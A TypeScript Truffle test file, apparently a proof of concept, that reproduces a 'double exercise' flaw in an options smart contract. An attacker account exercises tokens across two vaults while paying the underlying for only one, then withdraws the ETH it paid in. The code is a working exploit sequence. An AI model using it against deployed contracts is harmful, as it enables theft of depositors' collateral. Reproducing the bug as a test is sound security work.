import {
  ERC20MintableInstance,
  OptionsFactoryInstance,
  oTokenInstance
} from '../build/types/truffle-types';

import BigNumber from 'bignumber.js';

const OptionsContract = artifacts.require('OptionsContract');
const OptionsFactory = artifacts.require('OptionsFactory');
const MintableToken = artifacts.require('ERC20Mintable');

const {expectEvent, time} = require('@openzeppelin/test-helpers');

contract(
  'Double Exercise Exploit Test',
  ([opynDeployer, vaultOwner1, vaultOwner2, attacker]) => {
    let optionContract: oTokenInstance;
    let optionsFactory: OptionsFactoryInstance;
    let usdc: ERC20MintableInstance;

    const _name = 'Test Otoken';
    const _symbol = 'oETH';
    const decimals = 7;
    let _expiry: number;
    let _windowSize: number;

    const usdcAmountEachVault = new BigNumber(2000).times(1e6).toString(); // 20000 USDC to mint 200 ETH puts
    const oTokenAmountToMint = new BigNumber(10).times(
      new BigNumber(10).exponentiatedBy(decimals)
    );

    before('set up contracts', async () => {
      const now = (await time.latest()).toNumber();
      _expiry = now + time.duration.days(30).toNumber();
      _windowSize = _expiry; // time.duration.days(1).toNumber();

      // usdc token
      usdc = await MintableToken.new();

      // get deployed opyn protocol contracts

      // Options Factory contract and add assets to it
      optionsFactory = await OptionsFactory.deployed();

      // add assets to the factory
      await optionsFactory.addAsset('USDC', usdc.address, {from: opynDeployer});

      // create ETH call option
      const optionsContractResult = await optionsFactory.createOptionsContract(
        'USDC',
        -6,
        'ETH',
        -18,
        -decimals,
        20,
        -6,
        'USDC',
        _expiry,
        _windowSize,
        {from: opynDeployer}
      );

      optionContract = await OptionsContract.at(
        optionsContractResult.logs[1].args[0]
      );

      // set option details
      await optionContract.setDetails(_name, _symbol, {from: opynDeployer});

      // set option params
      await optionContract.updateParameters('100', '500', 0, 10, {
        from: opynDeployer
      });
    });

    describe('Hack 1: exercise on own vault and 1 other vault with same size.', async () => {
      before('go to exercise window', async () => {
        const timeToExercise = _expiry - _windowSize;
        const now = await time.latest();
        if (timeToExercise > now) await time.increaseTo(timeToExercise);
      });

      before('open vaults and get ready for attack', async () => {
        // mint money for everyone
        await usdc.mint(vaultOwner1, usdcAmountEachVault);
        await usdc.mint(vaultOwner2, usdcAmountEachVault);
        await usdc.mint(attacker, usdcAmountEachVault);

        await usdc.approve(optionContract.address, '10000000000000000000000', {
          from: vaultOwner1
        });
        await usdc.approve(optionContract.address, '10000000000000000000000', {
          from: vaultOwner2
        });
        await usdc.approve(optionContract.address, '10000000000000000000000', {
          from: attacker
        });

        // open vaults for everyone
        await optionContract.openVault({from: vaultOwner1});
        await optionContract.openVault({from: vaultOwner2});
        await optionContract.openVault({from: attacker});
        await optionContract.addERC20Collateral(
          vaultOwner1,
          usdcAmountEachVault.toString(),
          {from: vaultOwner1}
        );

        await optionContract.addERC20Collateral(
          vaultOwner2,
          usdcAmountEachVault,
          {from: vaultOwner2}
        );
        await optionContract.addERC20Collateral(
          attacker,
          usdcAmountEachVault.toString(),
          {
            from: attacker
          }
        );
        await optionContract.issueOTokens(
          oTokenAmountToMint.toString(),
          attacker,
          {
            from: vaultOwner1
          }
        );
        await optionContract.issueOTokens(oTokenAmountToMint, vaultOwner2, {
          from: vaultOwner2
        });
        await optionContract.issueOTokens(oTokenAmountToMint, attacker, {
          from: attacker
        });
      });

      it('should be able to exploit the contract only specifying half underlying.', async () => {
        const ethBalanceInContractBefore = await web3.eth.getBalance(
          optionContract.address
        );

        // specify the amount as 200 puts to exercise
        const amountToExercise = oTokenAmountToMint.times(2);
        // only supply 10 eth
        const incorrectETHAmount = new BigNumber(10).times(1e18).toString();

        await optionContract.exercise(
          amountToExercise,
          [vaultOwner1, attacker],
          {
            from: attacker,
            value: incorrectETHAmount
          }
        );

        const ethBalanceInContractAfter = await web3.eth.getBalance(
          optionContract.address
        );

        assert.equal(
          (ethBalanceInContractAfter - ethBalanceInContractBefore).toString(),
          incorrectETHAmount
        );
      });

      it('should redeem ETH from vault to cancel out initail 10 ETH.', async () => {
        const amount = new BigNumber(10).times(1e18);

        const contractETBefore = await web3.eth.getBalance(
          optionContract.address
        );

        expectEvent(
          await optionContract.removeUnderlying({from: attacker}),
          'RemoveUnderlying',
          {
            amountUnderlying: amount.toString()
          }
        );

        const contractETHAfter = await web3.eth.getBalance(
          optionContract.address
        );
        assert.equal(amount.toNumber(), contractETBefore - contractETHAfter);
      });
    });
  }
);
